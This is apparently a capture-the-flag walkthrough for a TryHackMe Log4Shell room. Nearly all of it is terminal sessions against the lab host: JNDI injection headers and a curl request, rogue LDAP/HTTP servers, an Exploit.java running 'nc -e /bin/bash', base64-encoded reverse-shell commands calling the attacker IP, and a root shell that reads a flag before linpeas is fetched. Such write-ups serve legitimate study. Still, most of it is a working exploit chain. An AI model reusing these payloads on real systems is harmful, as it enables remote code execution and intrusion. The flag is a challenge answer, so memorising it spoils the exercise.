----
No logs, no crime... so says the lumberjack.
----

![](https://www.honeytokens.io/img/LumberjackTurtle.png)

![](https://tryhackme-images.s3.amazonaws.com/room-icons/89ef3c44b9b2c745aeee7fda1498e483.png)
### Task 1  Deploy your target

 Start Machine

Deploy the machine. Wait **7 minutes** for everything to startup.

(go get a cup of _java_ ☕ or something)

Answer the questions below

Target is up. Time to recon...

Correct Answer

### Task 2  Challenge

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/60cc02296b08450051b3f11b/room-content/11f1fcc9f0e429b239a54be50c58faeb.png)  

([root does a body good. pass it on](https://www.youtube.com/watch?v=Zy63_nKaoy8))

What do lumberjacks and turtles have to do with this challenge?

Hack into the machine. Get root.  You'll figure it out.  

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.82.254 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.82.254:22
Open 10.10.82.254:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-08 17:18 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:18
Completed NSE at 17:18, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:18
Completed NSE at 17:18, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:18
Completed NSE at 17:18, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 17:18
Completed Parallel DNS resolution of 1 host. at 17:18, 0.01s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 17:18
Scanning 10.10.82.254 [2 ports]
Discovered open port 22/tcp on 10.10.82.254
Discovered open port 80/tcp on 10.10.82.254
Completed Connect Scan at 17:18, 0.21s elapsed (2 total ports)
Initiating Service scan at 17:18
Scanning 2 services on 10.10.82.254
Completed Service scan at 17:18, 13.60s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.82.254.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:18
Completed NSE at 17:19, 26.16s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:19
Completed NSE at 17:19, 1.09s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:19
Completed NSE at 17:19, 0.00s elapsed
Nmap scan report for 10.10.82.254
Host is up, received user-set (0.21s latency).
Scanned at 2023-07-08 17:18:45 EDT for 41s

PORT   STATE SERVICE     REASON  VERSION
22/tcp open  ssh         syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6aa12d136c8f3a2de3ed84f4c7bf2032 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDCnZPtl8mVLJYrSASHm7OakFUsWHrIN9hsDpkfVuJIrX9yTG0yhqxJI1i8dbI/MrexUGrIGzYbgLpYgKGsH4Q4dxB9bj507KQaTLWXwogdrkCVtP0WuGCo2EPZKorU85EWZAhrefG1Pzj3lAx1IdaxTHIS5zTqEJSZYttPF4BHb2avjKDVfSA+4cLP7ybq0rgohJ7JLG5+1dR/ijrGpaXnfudm/9BVjiKcGMlENS6bQ+a32Fs7wxL5c7RfKoR0CjA+pROXrOj5blQM4CI4wrEdphPZ/900I4DJ+kA6Ga+NJF6donQOmmhjsEEpI6RYcz6n/4ql1bomnyyI+jayyf3t
|   256 1dac5bd67c0c7b5bd4fee8fca16adf7a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBPkLzZd9EQTP/90Y/G1/CYr+PGrh376Qm6aZTO0HZ7lCZ0dExE834/QZ1vNyQPk4jg1KmS09Mzjz1UWWtUCYLg=
|   256 13ee5178417e3f543b9a249b06e2d514 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFdrmxj3Q5Et6BwEm7pC8cz5louqLoEAwNXGHi+3ee+t
80/tcp open  nagios-nsca syn-ack Nagios NSCA
|_http-title: Site doesn't have a title (text/plain;charset=UTF-8).
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:19
Completed NSE at 17:19, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:19
Completed NSE at 17:19, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:19
Completed NSE at 17:19, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.43 seconds

┌──(witty㉿kali)-[~/Downloads]
└─$ gobuster -t 64 dir -e -k -u http://10.10.82.254 -w /usr/share/wordlists/dirb/common.txt                        
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.82.254
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2023/07/08 17:24:59 Starting gobuster in directory enumeration mode
===============================================================
http://10.10.82.254/~logs                (Status: 200) [Size: 29]
http://10.10.82.254/error                (Status: 500) [Size: 73]
Progress: 4575 / 4615 (99.13%)
===============================================================
2023/07/08 17:25:23 Finished
===============================================================

No logs, no crime. Go deeper.

┌──(witty㉿kali)-[~/Downloads]
└─$ gobuster -t 64 dir -e -k -u http://10.10.82.254/~logs -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.82.254/~logs
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2023/07/08 17:27:23 Starting gobuster in directory enumeration mode
===============================================================
http://10.10.82.254/~logs/log4j                (Status: 200) [Size: 47]

Hello, vulnerable world! What could we do HERE?

Attackers can take advantage of it by just inserting a line of code like ${jndi:ldap://[attacker_URL]}

GET /~logs/log4j HTTP/1.1

Host: ${jndi:ldap://10.8.19.103:4444}

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Connection: close

Upgrade-Insecure-Requests: 1


┌──(witty㉿kali)-[~/hackers_koth]
└─$ rlwrap nc -lvp 4444
listening on [any] 4444 ...
10.10.82.254: inverse host lookup failed: Unknown host
connect to [10.8.19.103] from (UNKNOWN) [10.10.82.254] 42880
0
0
0

uhmm

GET /~logs/log4j HTTP/1.1

Host: 10.10.82.254

User-Agent: ${jndi:ldap://10.8.19.103:4444}

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Connection: close

Upgrade-Insecure-Requests: 1

HTTP/1.1 200 

X-THM-HINT: CVE-2021-44228 against X-Api-Version

Content-Type: text/html;charset=UTF-8

Content-Length: 47

Date: Sat, 08 Jul 2023 21:30:32 GMT

Connection: close



Hello, vulnerable world! What could we do HERE?

┌──(witty㉿kali)-[~/Downloads]
└─$ java -version
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
openjdk version "17.0.6" 2023-01-17
OpenJDK Runtime Environment (build 17.0.6+10-Debian-1)
OpenJDK 64-Bit Server VM (build 17.0.6+10-Debian-1, mixed mode, sharing)

┌──(witty㉿kali)-[~/Downloads]
└─$ sudo apt-get install maven

┌──(witty㉿kali)-[~/Downloads]
└─$ mvn -v                    
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Apache Maven 3.8.7
Maven home: /usr/share/maven
Java version: 17.0.6, vendor: Debian, runtime: /usr/lib/jvm/java-17-openjdk-amd64
Default locale: en_US, platform encoding: UTF-8
OS name: "linux", version: "6.1.0-kali5-amd64", arch: "amd64", family: "unix"

┌──(witty㉿kali)-[~/Downloads]
└─$ git clone https://github.com/veracode-research/rogue-jndi
Cloning into 'rogue-jndi'...
remote: Enumerating objects: 80, done.
remote: Counting objects: 100% (16/16), done.
remote: Compressing objects: 100% (10/10), done.
remote: Total 80 (delta 8), reused 6 (delta 6), pack-reused 64
Receiving objects: 100% (80/80), 24.71 KiB | 301.00 KiB/s, done.
Resolving deltas: 100% (30/30), done.
                                                                                          
┌──(witty㉿kali)-[~/Downloads]
└─$ cd rogue-jndi 
                                                                                          
┌──(witty㉿kali)-[~/Downloads/rogue-jndi]
└─$ ls
LICENSE  pom.xml  README.md  src
                                                                                          
┌──(witty㉿kali)-[~/Downloads/rogue-jndi]
└─$ mvn package

[INFO] ------------------------------------------------------------------------
[INFO] BUILD SUCCESS
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  16.776 s
[INFO] Finished at: 2023-07-08T17:48:22-04:00
[INFO] ------------------------------------------------------------------------

┌──(witty㉿kali)-[~/Downloads/rogue-jndi/target]
└─$ ls
classes            maven-archiver  original-RogueJndi-1.1.jar
generated-sources  maven-status    RogueJndi-1.1.jar
                                                                                          
┌──(witty㉿kali)-[~/Downloads/rogue-jndi/target]
└─$ cd ..    
                                                                                          
┌──(witty㉿kali)-[~/Downloads/rogue-jndi]
└─$ ls
dependency-reduced-pom.xml  LICENSE  pom.xml  README.md  src  target

┌──(witty㉿kali)-[~/Downloads/rogue-jndi]
└─$ echo 'bash -c bash -i >&/dev/tcp/10.8.19.103/4444 0>&1' | base64
YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuOC4xOS4xMDMvNDQ0NCAwPiYxCg==

┌──(witty㉿kali)-[~/Downloads/rogue-jndi/target]
└─$ java -jar RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuOC4xOS4xMDMvNDQ0NCAwPiYxCg==} | {base64,-d}|{bash,-i}" --hostname "10.8.19.103" 
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+-+-+-+-+-+-+-+-+-+
|R|o|g|u|e|J|n|d|i|
+-+-+-+-+-+-+-+-+-+
Starting HTTP server on 0.0.0.0:8000
Starting LDAP server on 0.0.0.0:1389
Mapping ldap://10.8.19.103:1389/ to artsploit.controllers.RemoteReference
Mapping ldap://10.8.19.103:1389/o=reference to artsploit.controllers.RemoteReference
Mapping ldap://10.8.19.103:1389/o=tomcat to artsploit.controllers.Tomcat
Mapping ldap://10.8.19.103:1389/o=websphere2 to artsploit.controllers.WebSphere2
Mapping ldap://10.8.19.103:1389/o=websphere2,jar=* to artsploit.controllers.WebSphere2
Mapping ldap://10.8.19.103:1389/o=groovy to artsploit.controllers.Groovy
Mapping ldap://10.8.19.103:1389/o=websphere1 to artsploit.controllers.WebSphere1
Mapping ldap://10.8.19.103:1389/o=websphere1,wsdl=* to artsploit.controllers.WebSphere1

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvp 4444                                      
listening on [any] 4444 ...

uhmm another way

_This is how it works_

1. When we send the payload `${jndi:ldap://attackerserver:1389/Exploit}` - it reaches out to our LDAP server .
2. The LDAP server forwards the request to our secondary server asking for the resource located at `http://attackerserver:8000/Exploit` .
3. Secondary server serves the `Exploit.class` file.
4. After retreiving , `the victim_server executes the code present in Exploit.class` (which is basically a reverse shell)
5. Once it executes , we get a reverse shell back on our netcat .

┌──(witty㉿kali)-[~/Downloads]
└─$ git clone https://github.com/mbechler/marshalsec.git     
Cloning into 'marshalsec'...
remote: Enumerating objects: 176, done.
remote: Counting objects: 100% (48/48), done.
remote: Compressing objects: 100% (18/18), done.
remote: Total 176 (delta 35), reused 34 (delta 28), pack-reused 128
Receiving objects: 100% (176/176), 474.14 KiB | 1.63 MiB/s, done.
Resolving deltas: 100% (91/91), done.
                                                                  
┌──(witty㉿kali)-[~/Downloads]
└─$ cd marshalsec 
                                                                  
┌──(witty㉿kali)-[~/Downloads/marshalsec]
└─$ ls             
LICENSE.txt  marshalsec.pdf  pom.xml  README.md  src

witty㉿kali)-[~/Downloads/marshalsec]
└─$ mvn clean package -DskipTests

[INFO] ------------------------------------------------------------------------
[INFO] BUILD SUCCESS
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  55.467 s
[INFO] Finished at: 2023-07-08T18:00:15-04:00
[INFO] ------------------------------------------------------------------------

┌──(witty㉿kali)-[~/Downloads/marshalsec/target]
└─$ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://10.8.19.103:8000/#Exploit"
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Listening on 0.0.0.0:1389

┌──(witty㉿kali)-[~/Downloads/marshalsec/target]
└─$ cat Exploit.java 
public class Exploit 
{ 
	static { 
		try { 
			java.lang.Runtime.getRuntime().exec("nc -e /bin/bash 10.8.19.103 9999"); 
			}
	catch (Exception e) 
			{ 
			e.printStackTrace(); 
			} 
		   } 
}

┌──(witty㉿kali)-[~/Downloads/marshalsec/target]
└─$ javac Exploit.java -source 8 -target 8
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
warning: [options] bootstrap class path not set in conjunction with -source 8
1 warning
                                                                                                          
┌──(witty㉿kali)-[~/Downloads/marshalsec/target]
└─$ ls
archive-tmp    Exploit.java            marshalsec-0.0.3-SNAPSHOT-all.jar  maven-status
classes        generated-sources       marshalsec-0.0.3-SNAPSHOT.jar      test-classes
Exploit.class  generated-test-sources  maven-archiver

┌──(witty㉿kali)-[~/Downloads/marshalsec/target]
└─$ python3 -m http.server     
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

┌──(witty㉿kali)-[~/Downloads/marshalsec/target]
└─$ rlwrap nc -lvp 4444  
listening on [any] 4444 ...

uhmm compiling with replit

┌──(witty㉿kali)-[~/Downloads]
└─$ mv Exploit.class /home/witty/Downloads/marshalsec/target/


 javac Exploit.java

 ls
Exploit.class  Main.class  replit.nix
Exploit.java   pom.xml     target

uhmm not work another way

https://github.com/christophetd/log4shell-vulnerable-app/blob/main/README.md

┌──(witty㉿kali)-[~/Downloads]
└─$ unzip JNDIExploit.v1.2.zip
Archive:  JNDIExploit.v1.2.zip
  inflating: JNDIExploit-1.2-SNAPSHOT.jar  
   creating: lib/
  inflating: lib/commons-beanutils-1.8.2.jar  
  inflating: lib/commons-beanutils-1.9.2.jar 

┌──(witty㉿kali)-[~/Downloads]
└─$ java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 10.8.19.103 -p 8888
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[+] LDAP Server Start Listening on 1389...
[+] HTTP Server Start Listening on 8888...

uhmm another way

┌──(witty㉿kali)-[~/Downloads/JNDI-Exploit-Kit]
└─$ 
java -jar target/JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar -L "10.8.19.103:1389" -C "echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAxMC44LjE5LjEwMyA5OTk5ID4vdG1wL2YK | base64 -d | bash"
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
       _ _   _ _____ _____      ______            _       _ _          _  ___ _   
      | | \ | |  __ \_   _|    |  ____|          | |     (_) |        | |/ (_) |  
      | |  \| | |  | || |______| |__  __  ___ __ | | ___  _| |_ ______| ' / _| |_ 
  _   | | . ` | |  | || |______|  __| \ \/ / '_ \| |/ _ \| | __|______|  < | | __|
 | |__| | |\  | |__| || |_     | |____ >  <| |_) | | (_) | | |_       | . \| | |_ 
  \____/|_| \_|_____/_____|    |______/_/\_\ .__/|_|\___/|_|\__|      |_|\_\_|\__|
                                           | |                                    
                                           |_|               created by @welk1n 
                                                             modified by @pimps 

[HTTP_ADDR] >> 10.8.19.103
[RMI_ADDR] >> 10.8.19.103
[LDAP_ADDR] >> 10.8.19.103
[COMMAND] >> echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAxMC44LjE5LjEwMyA5OTk5ID4vdG1wL2YK | base64 -d | bash
----------------------------JNDI Links---------------------------- 
Target environment(Build in JDK 1.6 whose trustURLCodebase is true):
rmi://10.8.19.103:1099/ul0ewk
ldap://10.8.19.103:1389/ul0ewk
Target environment(Build in JDK - (BYPASS WITH GROOVY by @orangetw) whose trustURLCodebase is false and have Tomcat 8+ and Groovy in classpath):
rmi://10.8.19.103:1099/1clb7e
Target environment(Build in JDK 1.8 whose trustURLCodebase is true):
rmi://10.8.19.103:1099/jyxqtq
ldap://10.8.19.103:1389/jyxqtq
Target environment(Build in JDK 1.7 whose trustURLCodebase is true):
rmi://10.8.19.103:1099/erzlut
ldap://10.8.19.103:1389/erzlut
Target environment(Build in JDK - (BYPASS WITH EL by @welk1n) whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):
rmi://10.8.19.103:1099/8eehjc
Target environment(Build in JDK 1.5 whose trustURLCodebase is true):
rmi://10.8.19.103:1099/jevuwo
ldap://10.8.19.103:1389/jevuwo

-------------------- LDAP SERIALIZED PAYLOADS -------------------- 

Payloads                                                     Supported Dynamic Commands                                      
--------                                                     --------------------------                                      
ldap://10.8.19.103:1389/serial/BeanShell1           exec_global, exec_win, exec_unix                                
ldap://10.8.19.103:1389/serial/C3P0                                                                                 
ldap://10.8.19.103:1389/serial/Clojure              exec_global                                                     
ldap://10.8.19.103:1389/serial/Clojure2             exec_global                                                     
ldap://10.8.19.103:1389/serial/CommonsBeanutils1    exec_global, exec_win, exec_unix, java_reverse_shell, sleep, dns
ldap://10.8.19.103:1389/serial/CommonsCollections1  exec_global, exec_win, exec_unix, sleep, dns                    
ldap://10.8.19.103:1389/serial/CommonsCollections10 exec_global, exec_win, exec_unix, java_reverse_shell, sleep, dns
ldap://10.8.19.103:1389/serial/CommonsCollections2  exec_global, exec_win, exec_unix, java_reverse_shell, sleep, dns
ldap://10.8.19.103:1389/serial/CommonsCollections3  exec_global, exec_win, exec_unix, java_reverse_shell, sleep, dns
ldap://10.8.19.103:1389/serial/CommonsCollections4  exec_global, exec_win, exec_unix, java_reverse_shell, sleep, dns
ldap://10.8.19.103:1389/serial/CommonsCollections5  exec_global, exec_win, exec_unix, sleep, dns                    
ldap://10.8.19.103:1389/serial/CommonsCollections6  exec_global, exec_win, exec_unix, sleep, dns                    
ldap://10.8.19.103:1389/serial/CommonsCollections7  exec_global, exec_win, exec_unix, sleep, dns                    
ldap://10.8.19.103:1389/serial/CommonsCollections8  exec_global, exec_win, exec_unix, java_reverse_shell, sleep, dns
ldap://10.8.19.103:1389/serial/CommonsCollections9  exec_global, exec_win, exec_unix, sleep, dns                    
ldap://10.8.19.103:1389/serial/Groovy1              exec_global                                                     
ldap://10.8.19.103:1389/serial/Hibernate1           exec_global, exec_win, exec_unix, java_reverse_shell, sleep, dns
ldap://10.8.19.103:1389/serial/JBossInterceptors1   exec_global, exec_win, exec_unix, java_reverse_shell, sleep, dns
ldap://10.8.19.103:1389/serial/JSON1                exec_global, exec_win, exec_unix, java_reverse_shell, sleep, dns
ldap://10.8.19.103:1389/serial/JavassistWeld1       exec_global, exec_win, exec_unix, java_reverse_shell, sleep, dns
ldap://10.8.19.103:1389/serial/Jdk7u21              exec_global, exec_win, exec_unix, java_reverse_shell, sleep, dns
ldap://10.8.19.103:1389/serial/Jython1              exec_global                                                     
ldap://10.8.19.103:1389/serial/MozillaRhino1        exec_global, exec_win, exec_unix, java_reverse_shell, sleep, dns
ldap://10.8.19.103:1389/serial/MozillaRhino2        exec_global, exec_win, exec_unix, java_reverse_shell, sleep, dns
ldap://10.8.19.103:1389/serial/Myfaces1             exec_global                                                     
ldap://10.8.19.103:1389/serial/ROME                 exec_global, exec_win, exec_unix, java_reverse_shell, sleep, dns
ldap://10.8.19.103:1389/serial/URLDNS               dns                                                             
ldap://10.8.19.103:1389/serial/Vaadin1              exec_global, exec_win, exec_unix, java_reverse_shell, sleep, dns
ldap://10.8.19.103:1389/serial/Jre8u20              exec_global, exec_win, exec_unix, java_reverse_shell, sleep, dns
ldap://10.8.19.103:1389/serial/CustomPayload                                                                        

[+] By default, serialized payloads execute the command passed in the -C argument with 'exec_global'.

[+] The CustomPayload is loaded from the -P argument. It doesn't support Dynamic Commands.

[+] Serialized payloads support Dynamic Command inputs in the following format:
    ldap://10.8.19.103:1389/serial/[payload_name]/exec_global/[base64_command]
    ldap://10.8.19.103:1389/serial/[payload_name]/exec_unix/[base64_command]
    ldap://10.8.19.103:1389/serial/[payload_name]/exec_win/[base64_command]
    ldap://10.8.19.103:1389/serial/[payload_name]/sleep/[miliseconds]
    ldap://10.8.19.103:1389/serial/[payload_name]/java_reverse_shell/[ipaddress:port]
    ldap://10.8.19.103:1389/serial/[payload_name]/dns/[domain_name]
    Example1: ldap://127.0.0.1:1389/serial/CommonsCollections5/exec_unix/cGluZyAtYzEgZ29vZ2xlLmNvbQ==
    Example2: ldap://127.0.0.1:1389/serial/Hibernate1/exec_win/cGluZyAtYzEgZ29vZ2xlLmNvbQ==
    Example3: ldap://127.0.0.1:1389/serial/Jdk7u21/java_reverse_shell/127.0.0.1:9999
    Example4: ldap://127.0.0.1:1389/serial/ROME/sleep/30000
    Example5: ldap://127.0.0.1:1389/serial/URLDNS/dns/sub.mydomain.com

----------------------------Server Log----------------------------
2023-07-08 21:05:27 [JETTYSERVER]>> Listening on 10.8.19.103:8180
2023-07-08 21:05:27 [RMISERVER]  >> Listening on 10.8.19.103:1099
2023-07-08 21:05:29 [LDAPSERVER] >> Listening on 0.0.0.0:1389
2023-07-08 21:06:52 [LDAPSERVER] >> Send LDAP reference result for erzlut redirecting to http://10.8.19.103:8180/ExecTemplateJDK7.class
2023-07-08 21:06:53 [JETTYSERVER]>> Received a request to http://10.8.19.103:8180/ExecTemplateJDK7.class

┌──(witty㉿kali)-[~/Downloads]
└─$ curl 'http://10.10.174.76/~logs/log4j' -H 'X-Api-Version: ${jndi:ldap://10.8.19.103:1389/erzlut}'
Hello, vulnerable world! Did we get pwnage?  

┌──(witty㉿kali)-[~/Downloads/marshalsec/target]
└─$ rlwrap nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.174.76] 33011
bash: cannot set terminal process group (1): Not a tty
bash: no job control in this shell
bash-4.4# which python
which python
bash-4.4# which python3
which python3
bash-4.4# script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
bash-4.4# ls -lah /
ls -lah /
total 68
drwxr-xr-x    1 root     root        4.0K Dec 13  2021 .
drwxr-xr-x    1 root     root        4.0K Dec 13  2021 ..
-rwxr-xr-x    1 root     root           0 Dec 13  2021 .dockerenv
drwxr-xr-x    1 root     root        4.0K Dec 11  2021 app
drwxr-xr-x    1 root     root        4.0K Dec 11  2021 bin
drwxr-xr-x   12 root     root        3.4K Jul  9 00:46 dev
drwxr-xr-x    1 root     root        4.0K Dec 13  2021 etc
drwxr-xr-x    2 root     root        4.0K Dec 20  2018 home
drwxr-xr-x    1 root     root        4.0K Dec 11  2021 lib
drwxr-xr-x    5 root     root        4.0K Dec 20  2018 media
drwxr-xr-x    2 root     root        4.0K Dec 20  2018 mnt
drwxr-xr-x    1 root     root        4.0K Dec 11  2021 opt
dr-xr-xr-x  102 root     root           0 Jul  9 00:46 proc
drwx------    2 root     root        4.0K Dec 20  2018 root
drwxr-xr-x    2 root     root        4.0K Dec 20  2018 run
drwxr-xr-x    1 root     root        4.0K Dec 11  2021 sbin
drwxr-xr-x    2 root     root        4.0K Dec 20  2018 srv
dr-xr-xr-x   13 root     root           0 Jul  9 00:46 sys
drwxrwxrwt    1 root     root        4.0K Jul  9 01:06 tmp
drwxr-xr-x    1 root     root        4.0K Dec 21  2018 usr
drwxr-xr-x    1 root     root        4.0K Dec 20  2018 var
bash-4.4# cd /opt
cd /opt
bash-4.4# ls
ls
bash-4.4# ls -lah
ls -lah
total 12
drwxr-xr-x    1 root     root        4.0K Dec 11  2021 .
drwxr-xr-x    1 root     root        4.0K Dec 13  2021 ..
-rw-r--r--    1 root     root          19 Dec 11  2021 .flag1
bash-4.4# cat .flag1
cat .flag1
THM{LOG4SHELL_FTW}
bash-4.4# cd /home
cd /home
bash-4.4# ls -lah
ls -lah
total 8
drwxr-xr-x    2 root     root        4.0K Dec 20  2018 .
drwxr-xr-x    1 root     root        4.0K Dec 13  2021 ..

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.174.76 - - [08/Jul/2023 21:12:58] "GET /linpeas.sh HTTP/1.1" 200 -

bash-4.4# wget http://10.8.19.103:8000/linpeas.sh
wget http://10.8.19.103:8000/linpeas.sh
Connecting to 10.8.19.103:8000 (10.8.19.103:8000)
linpeas.sh             1% |                               | 11484   linpeas.sh             1% |                               | 11484   linpeas.sh             1% |                               | 11484   linpeas.sh            21% |******                         |   176k  linpeas.sh             1% |                               | 11484   linpeas.sh            21% |******                         |   176k  linpeas.sh           100% |*******************************|   808k  0:00:00 ETA
bash-4.4# chmod +x linpeas.sh
chmod +x linpeas.sh
bash-4.4# ./linpeas.sh
./linpeas.sh


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
